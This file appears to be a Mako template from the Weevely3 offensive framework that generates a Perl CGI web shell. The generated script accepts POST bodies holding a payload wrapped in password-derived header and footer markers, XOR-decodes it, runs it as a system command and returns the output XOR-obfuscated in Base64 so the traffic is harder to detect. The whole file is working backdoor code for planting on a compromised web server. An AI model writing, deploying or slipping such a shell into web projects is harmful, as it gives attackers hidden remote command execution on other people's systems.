<%! import hashlib, weevely, string %>
<%
passwordhash = hashlib.md5(password.encode('utf-8')).hexdigest().lower()
key = passwordhash[:8]
header = passwordhash[8:20]
footer = passwordhash[20:32]
PREPEND = weevely.utils.strings.randstr(16, charset = string.digits + string.ascii_letters).decode('utf-8')
%>
<%text>#!/usr/bin/env perl</%text>
use strict;
use warnings;
use MIME::Base64;

# Weevely3 Perl CGI Agent
# Implements XOR -> Base64 protocol (No GZIP to avoid non-core deps)

my $k = "${key}";
my $kh = "${header}";
my $kf = "${footer}";
my $p = "${PREPEND}";

print "Content-Type: text/plain\n\n";

if ($ENV{'REQUEST_METHOD'} eq 'POST') {
    read(STDIN, my $content, $ENV{'CONTENT_LENGTH'});
    
    my $start = index($content, $kh);
    my $end = index($content, $kf);
    
    if ($start != -1 && $end != -1) {
        my $payload = substr($content, $start + length($kh), $end - ($start + length($kh)));
        
        # Decode: Base64 -> XOR
        my $decoded = decode_base64($payload);
        my $unxorred = xor_str($decoded, $k);
        
        # Execute
        my $output = `$unxorred 2>&1`;
        
        # Encode: XOR -> Base64
        my $re_xorred = xor_str($output, $k);
        my $encoded = encode_base64($re_xorred, "");
        
        print $p . $kh . $encoded . $kf;
    }
}

sub xor_str {
    my ($text, $key) = @_;
    my $res = "";
    my $klen = length($key);
    
    for (my $i = 0; $i < length($text); $i++) {
        $res .= chr(ord(substr($text, $i, 1)) ^ ord(substr($key, $i % $klen, 1)));
    }
    return $res;
}
